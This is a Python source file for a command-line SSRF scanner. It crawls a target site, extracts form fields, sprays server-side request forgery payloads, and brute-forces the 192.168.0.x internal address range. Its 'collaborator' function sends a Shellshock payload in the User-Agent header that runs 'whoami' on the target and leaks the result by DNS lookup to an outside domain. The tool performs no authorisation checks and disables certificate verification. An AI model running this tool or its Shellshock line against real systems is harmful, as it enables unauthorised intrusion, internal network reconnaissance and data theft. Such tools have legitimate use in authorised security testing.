import concurrent.futures, subprocess, re, time, ipaddress
from urllib.parse import quote, urljoin, urlparse, parse_qs, urlunparse
import requests, urllib3
from bs4 import BeautifulSoup
from colorama import Fore, Style
import shutil
import argparse
import json
import csv
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variables for results
results = []

def print_shapes():
    pattern = "━━━━━━━━━━━━━━━━━━━━━"
    terminal_width = shutil.get_terminal_size((80, 20)).columns
    repeats = (terminal_width // (len(pattern) + 1)) + 1  
    full_line = (pattern + "") * repeats
    print(f"{Fore.BLUE}{full_line[:terminal_width]}"+Style.RESET_ALL)

def print_header(title):
    header = f"{Fore.CYAN}{'=' * 60}\n{title.center(60)}\n{'=' * 60}{Style.RESET_ALL}"
    print(f"\n{header}\n")

def ssrf_post(url, payload, param, session=None, return_bool=False, proxies=None):
    global results
    params = {param: payload}
    s = session or requests
    try:
        r = s.post(url, data=params, verify=False, timeout=5, proxies=proxies)
    except requests.exceptions.RequestException:
        return False
    if "internal server error" not in r.text.lower() and "not found" not in r.text.lower() and "missing parameter" not in r.text.lower() and "invalid url" not in r.text.lower() and "invalid" not in r.text.lower() and "host must be" not in r.text.lower():
        result = {
            "URL": url,
            "Payload": payload,
            "Parameter": param
        }
        results.append(result)
        if return_bool:
            return True
        print(Fore.GREEN + f"{Style.BRIGHT}The site is vulnerable to SSRF in {Fore.RED}{Style.BRIGHT}{url}{Fore.GREEN}{Style.BRIGHT} with this vulnerability :\n{Fore.RED}{Style.BRIGHT}{payload} "+f"{Fore.GREEN}{Style.BRIGHT}via "+Fore.RED+f"{Style.BRIGHT}{param} "+Fore.GREEN+f"{Style.BRIGHT}parameter"+Style.RESET_ALL) 
        return True
    return False

def load_payloads(filename):
    payloads = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):  
                payloads.append(line)
    return payloads

def fetch_content(url, timeout=5.0, proxies=None):
    try:
        response = requests.get(url, timeout=timeout, verify=False, proxies=proxies)
        response.raise_for_status()
        return response.text
    except requests.RequestException:
        return ""

def extract_actions(content): return re.findall(r'action=["\'](.*?)["\']', content, re.IGNORECASE)
def extract_values(content): return re.findall(r'value=["\'](.*?)["\']', content, re.IGNORECASE)
def extract_names(content): return re.findall(r'name=["\'](.*?)["\']', content, re.IGNORECASE)

def extract_base_url(full_url):
    parsed = urlparse(full_url)
    return f"{parsed.scheme}://{parsed.netloc}"

def filter_similar_urls(urls):
    unique, seen = [], set()
    for url in urls:
        base = urljoin(url, urlparse(url).path)
        if base not in seen:
            unique.append(url)
            seen.add(base)
    return unique

def is_valid_ip_with_port(ip_port):
    try:
        if ":" in ip_port and ip_port.count(".") == 3:  # IPv4:port
            ip, port = ip_port.split(":")
            if all(0 <= int(octet) <= 255 for octet in ip.split(".")) and (0 <= int(port) <= 65535):
                return True
        elif ip_port.startswith('['):  # IPv6:port
            ip, port = ip_port.rsplit("]:", 1)
            ip = ip.lstrip('[')
            ipaddress.IPv6Address(ip)
            return 0 <= int(port) <= 65535
    except Exception:
        return False
    return False

def path_payload(url, pay, param, payloads, proxies=None):
    payload = {param: pay}
    session = requests.Session()
    try:
        response = session.get(url, proxies=proxies, verify=False, timeout=5)
        default_headers = response.request.headers
        headers = {
            "Host": response.url.split("/")[2],  
            "Cookie": response.headers.get("Set-Cookie", ""),   
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": default_headers.get("User-Agent", "Mozilla/5.0"),
            "Referer": response.url
        }
        r = session.post(url, data=payload, headers=headers, verify=False, timeout=5, proxies=proxies)
    except requests.exceptions.RequestException:
        return
    if payloads in r.text.lower():
        global results
        result = {"URL": url, "Payload": pay, "Parameter": param}
        results.append(result)
        print(Fore.GREEN + f"{Style.BRIGHT}The site is vulnerable to SSRF in {Fore.RED}{Style.BRIGHT}{url}{Fore.GREEN}{Style.BRIGHT} with this vulnerability :\n{Fore.RED}{Style.BRIGHT}{pay} "+f"{Fore.GREEN}{Style.BRIGHT}via "+Fore.RED+f"{Style.BRIGHT}{param} "+Fore.GREEN+f"{Style.BRIGHT}parameter"+Style.RESET_ALL)

def send_with_referer(url, ref_payload, proxies=None):
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        orginal_request = requests.get(url, headers=headers, timeout=5, proxies=proxies)
        headers["Referer"] = ref_payload
        r = requests.get(url, headers=headers, timeout=5, proxies=proxies)
        if (r.status_code != orginal_request.status_code) or (len(r.text) != len(orginal_request.text)):
            print("The site is vulnerable to SSRF:", ref_payload)
    except requests.exceptions.RequestException:
        pass

def collaborator(target_url, collab_domain, proxies=None):
    shellshock = f"() {{ :; }}; /usr/bin/nslookup $(whoami).{collab_domain}"
    for x in range(1, 256):
        ip = f"192.168.0.{x}"
        headers = {"Referer": f"http://{ip}:8080", "User-Agent": shellshock}
        try:
            response = requests.get(target_url, headers=headers, timeout=5, proxies=proxies)
        except requests.exceptions.RequestException as e:
            return

def url_encode(original_url):
    encoded = quote(original_url, safe="/")
    return re.sub(r"%([0-9A-F]{2})", lambda m: f"%{m.group(1).lower()}", encoded)

def extract_links(url, proxies=None):
    try:
        response = requests.get(url, proxies=proxies)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()
        for a_tag in soup.find_all('a', href=True):
            full_link = urljoin(url, a_tag['href'])
            parsed_url = urlparse(full_link)
            query_params = parse_qs(parsed_url.query)
            if 'path' in query_params:
                clean_link = full_link.split('path=')[0] + 'path='
                links.add(clean_link)
        return links
    except requests.exceptions.RequestException as e:
        return set()

def process_payload(ip, i, target_url, payload, name, proxies=None):
    constructed_url = "http://" + ip[:10] + str(i) + ip[-5:]
    if ssrf_post(target_url, constructed_url + payload, name, return_bool=True, proxies=proxies):
        print(Fore.GREEN + f"{Style.BRIGHT}The site is vulnerable to SSRF in {Fore.RED}{Style.BRIGHT}{target_url}{Fore.GREEN}{Style.BRIGHT} with this With this vulnerability :\n{Fore.RED}{Style.BRIGHT}{constructed_url + payload} "+f"{Fore.GREEN}{Style.BRIGHT}via "+Fore.RED+f"{Style.BRIGHT}{name} "+Fore.GREEN+f"{Style.BRIGHT}parameter"+Style.RESET_ALL)

def save_to_json(data, filename):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)

def display_json(data):
    print("\n" + json.dumps(data, indent=4))

def save_to_csv(data, filename):
    with open(filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["URL", "Payload", "Parameter"])
        for entry in data:
            writer.writerow([entry["URL"], entry["Payload"], entry["Parameter"]])

def display_csv(data):
    print(f"{'URL':<40} | {'Payload':<30} | {'Parameter'}")
    print("-" * 100)
    for entry in data:
        print(f"{entry['URL']:<40} | {entry['Payload']:<30} | {entry['Parameter']}")

def process_single_url(base_url, ssrf_payloads, path_payloads, args, proxies):
    global results
    print(Fore.MAGENTA + "▶ Enter target URL :" + Style.RESET_ALL)
    print(Fore.GREEN + base_url + Style.RESET_ALL)
    main_page_content = fetch_content(base_url, proxies=proxies)
    raw_links = set(re.findall(r'href=["\'](.*?)["\']', main_page_content))
    absolute_links = {urljoin(base_url, link) for link in raw_links}
    actions_list, value_fields_list, name_fields_list = [], [], []
    print_shapes()
    print(Fore.MAGENTA + "Links found and checked:" + Style.RESET_ALL)
    for link in absolute_links:
        print(Fore.GREEN + link + Style.RESET_ALL)
        page_content = fetch_content(link, proxies=proxies)
        for func in (extract_actions, extract_values, extract_names):
            for item in func(page_content):
                if func == extract_actions and item not in actions_list:
                    actions_list.append(item)
                elif func == extract_values and item not in value_fields_list:
                    value_fields_list.append(item)
                elif func == extract_names and item not in name_fields_list:
                    name_fields_list.append(item)
    result_links = filter_similar_urls(absolute_links)
    url_value = []
    for v in value_fields_list:
        base_v = extract_base_url(v)
        if base_v not in url_value:
            url_value.append(base_v)
    print_shapes()
    print(Fore.MAGENTA + "Request body parameters:" + Style.RESET_ALL)
    for name in name_fields_list:
        print(Fore.GREEN + name + Style.RESET_ALL)
    target_urls = [f"{base_url}{action}" for action in actions_list]
    print_shapes()
    print(Fore.MAGENTA + "Links that work with POST and GET methods:" + Style.RESET_ALL)
    for t in target_urls:
        print(Fore.GREEN + t + Style.RESET_ALL)
    ip_ports = [i.split("://")[-1] for i in url_value]
    print_shapes()
    print(Fore.MAGENTA + "Links with IP addresses:" + Style.RESET_ALL)
    for ip in ip_ports:
        print(Fore.GREEN + ip + Style.RESET_ALL)
    print_shapes()
    print(Fore.MAGENTA + "Sending payload with found IP addresses:" + Style.RESET_ALL)
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 50) as executor:
        for ip in ip_ports:
            if is_valid_ip_with_port(ip):
                for i in range(1, 256):
                    for target in target_urls:
                        for payload in path_payloads:
                            for name in name_fields_list:
                                executor.submit(process_payload, ip, i, target, payload, name, proxies)
    print_shapes()
    print(Fore.MAGENTA + "Sending payload with parameters found:" + Style.RESET_ALL)
    tasks = [(target, payload, name) for target in target_urls for payload in ssrf_payloads for name in name_fields_list]
    with requests.Session() as session:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 20) as executor:
            futures = [executor.submit(ssrf_post, url, payload, name, session, False, proxies) for url, payload, name in tasks]
            concurrent.futures.wait(futures)
    print_shapes()
    print(Fore.MAGENTA + "Send path payload :" + Style.RESET_ALL)
    tar = []
    for k in result_links:
        p = extract_links(k, proxies=proxies)
        p_cleaned = [url.replace(base_url, "") for url in p]
        tar.extend(p_cleaned)
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 50) as executor:
        futures = []
        for target_url in target_urls:
            for payload in path_payloads:
                for u in tar:
                    combined = u + payload
                    encoded_text = url_encode(combined)
                    for n in name_fields_list:
                        futures.append(executor.submit(path_payload, target_url, encoded_text, n, payload, proxies))
        concurrent.futures.wait(futures)
    if args.collaborator:
        collab_domain = args.collaborator.strip()
        print(Fore.MAGENTA + "Sending Burp Collaborator domain with payload in referer header:" + Style.RESET_ALL)
        for link in result_links:
            send_with_referer(link, "http://" + collab_domain, proxies)
        if input(f"{Fore.MAGENTA}Do you want to do bruteforce attack with Collaborator domain: {Style.RESET_ALL}").strip().lower() == "yes":
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads or 20) as executor:
                futures = [executor.submit(collaborator, link, collab_domain, proxies) for link in result_links]
                concurrent.futures.wait(futures)
    # Save results if output format is specified
    if args.output:
        if args.output == "json":
            display_json(results)
            save_to_json(results, "results.json")
        elif args.output == "csv":
            display_csv(results)
            save_to_csv(results, "results.csv")
    else:
        for res in results:
            print(res)

def main():
    parser = argparse.ArgumentParser(description="SSRF Scanner")
    parser.add_argument('-u', '--url', help="Single target URL")
    parser.add_argument('-l', '--url-list', help="List of URLs to scan")
    parser.add_argument('-o', '--output', choices=['json', 'csv'], help="Output format (json/csv)")
    parser.add_argument('-t', '--threads', type=int, help="Number of threads")
    parser.add_argument('-pay', '--payload-list', help="Custom payload list file")
    parser.add_argument('-path', '--path-payload-list', help="Custom path payload list file")
    parser.add_argument('-c', '--collaborator', help="Burp Collaborator domain")
    parser.add_argument("-p", "--proxy", help="Proxy server for traffic inspection (e.g., Burp Suite: 127.0.0.1:8080)")
    args = parser.parse_args()
    # Setup proxy if provided
    proxies = {}
    if args.proxy:
        host_port = args.proxy
        proxies = {
            "http": f"http://{host_port}",
            "https": f"http://{host_port}"
        }
    # Default payload lists
    default_payload_list = "payload.txt"
    default_path_payload_list = "pathpayload.txt"
    # Get payload lists
    payload_list = args.payload_list or default_payload_list
    path_payload_list = args.path_payload_list or default_path_payload_list
    # Read payloads once
    ssrf_payloads = load_payloads(payload_list)
    path_payloads = load_payloads(path_payload_list)
    print_header("SSRF SCANNER STARTING")
    if args.url:
        base_url = args.url.strip()
        if base_url.endswith('/'):
            base_url = base_url[:-1]
        process_single_url(base_url, ssrf_payloads, path_payloads, args, proxies)
    elif args.url_list:
        with open(args.url_list, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
            for url in urls:
                if url.endswith('/'):
                    url = url[:-1]
                try:
                    process_single_url(url, ssrf_payloads, path_payloads, args, proxies)
                except Exception as e:
                    print(f"{Fore.RED}Error processing {url}: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()